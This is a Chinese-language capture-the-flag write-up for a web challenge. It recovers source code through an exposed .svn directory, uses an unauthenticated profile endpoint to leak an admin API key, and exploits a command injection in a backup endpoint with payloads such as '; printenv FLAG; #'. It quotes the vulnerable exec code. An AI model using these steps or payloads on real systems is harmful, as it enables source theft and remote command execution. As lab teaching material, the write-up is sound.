# web_version 解题过程

题面提示"版本控制留下的痕迹，从不会真正消失"，指向 `.svn` 泄露。

## 0x00 探路

首页只有一个登录框，随便登录返回：

```bash
curl -s -X POST http://HOST:3000/login \
     -H 'content-type: application/json' -d '{"username":"test"}'
# {"ok":true,"id":3,"username":"test","role":"user"}
```

接口正常，但没有任何有价值的入口。按提示想到先翻版本控制目录：

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://HOST:3000/.svn/wc.db
# 200
```

`.svn` 目录可访问，命中源码泄露。

## 0x01 还原源码：解析 wc.db + pristine

现代 SVN（1.7+）工作副本用单库格式，`.svn/wc.db` 是 SQLite 数据库。

```bash
curl -s http://HOST:3000/.svn/wc.db -o wc.db
sqlite3 wc.db "SELECT local_relpath, checksum FROM NODES WHERE op_depth=0 AND checksum IS NOT NULL;"
```

输出（节选）：

```
server.js      $sha1$3f2a... 
routes/user.js $sha1$9c1b...
routes/admin.js $sha1$7ad4...
public/index.html $sha1$...
package.json   $sha1$...
```

`checksum` 去掉 `$sha1$` 前缀就是内容哈希；原始文件按哈希前两位分目录，存放在
`.svn/pristine/`：

```bash
# 以 server.js 为例，哈希 3f2a...
curl -s http://HOST:3000/.svn/pristine/3f/3f2a....svn-base -o server.js
```

也可以偷懒用 `dvcs-ripper`：

```bash
./rip-svn.pl -u http://HOST:3000/.svn/ -o loot
```

还原出的目录结构：

```
server.js
routes/user.js
routes/admin.js
public/index.html
public/assets/app.js
package.json
```

## 0x02 审计：越权接口 `/api/profile/:id`

读 `server.js`，看到启动种子：

```js
const users = [
  { id: 1, username: 'admin', role: 'admin', apiKey: crypto.randomBytes(16).toString('hex') },
  { id: 2, username: 'guest', role: 'user', apiKey: null },
];
...
app.use('/api', userRoutes(users));
app.use('/admin', adminRoutes(users));
```

管理员固定 `id=1`，且持有 `apiKey`（值每次启动随机生成、不落盘）。再看
`routes/user.js`：

```js
router.get('/profile/:id', (req, res) => {
  const id = Number.parseInt(req.params.id, 10);
  const user = users.find((u) => u.id === id);
  if (!user) return res.status(404).json({ error: 'user not found' });
  res.json({ id: user.id, username: user.username, role: user.role, apiKey: user.apiKey });
});
```

**全程没有鉴权、没有属主判断**，返回体还带出 `apiKey`。直接越权读管理员：

```bash
curl -s http://HOST:3000/api/profile/1
# {"id":1,"username":"admin","role":"admin","apiKey":"e9c1f0d2...."}
```

拿到 `apiKey`。

## 0x03 审计：`/admin/backup` 命令注入

读 `routes/admin.js`：

```js
router.post('/backup', (req, res) => {
  const key = req.get('x-api-key') || '';
  const admin = users.find((u) => u.role === 'admin' && apiKeyMatches(key, u.apiKey));
  if (!admin) return res.status(403).json({ error: 'admin api key required' });

  const target = (req.body && req.body.target) || '/srv/www';
  exec(`tar -czf /tmp/release_${Date.now()}.tar.gz ${target}`, (err, stdout, stderr) => {
    res.json({ ok: !err, stdout, stderr });
  });
});
```

鉴权只认 `x-api-key`（正是刚才越权拿到的），而 `target` 被原样拼进 shell 命令，
无任何转义。且回调把命令 `stdout` 回显在 JSON 里。flag 只在环境变量 `FLAG` 中，
没有文件，所以走得通的路就是命令注入回显：

```bash
KEY=$(curl -s http://HOST:3000/api/profile/1 | python3 -c 'import sys,json;print(json.load(sys.stdin)["apiKey"])')

curl -s -X POST http://HOST:3000/admin/backup \
     -H "x-api-key: $KEY" -H 'content-type: application/json' \
     -d '{"target":"; printenv FLAG; #"}'
# {"ok":false,"stdout":"HCTF{...}\n","stderr":"tar: ..."}
```

`stdout` 里的 `HCTF{...}` 即 flag。

也可以不用分号，用命令替换更干净：

```bash
-d '{"target":"$(printenv FLAG)"}'
```

## 0x04 小结

| 步骤 | 考点 |
|---|---|
| `/.svn/wc.db` + `.svn/pristine/` | SVN 工作副本格式与源码还原 |
| `/api/profile/:id` 无鉴权返回 `apiKey` | 代码审计 / IDOR 水平越权 |
| `/admin/backup` 拼接 `target` 进 `exec` | 命令注入 RCE |
| `printenv FLAG` | 动态 flag 只存在于环境变量 |

一键复现见 `exp.py`。
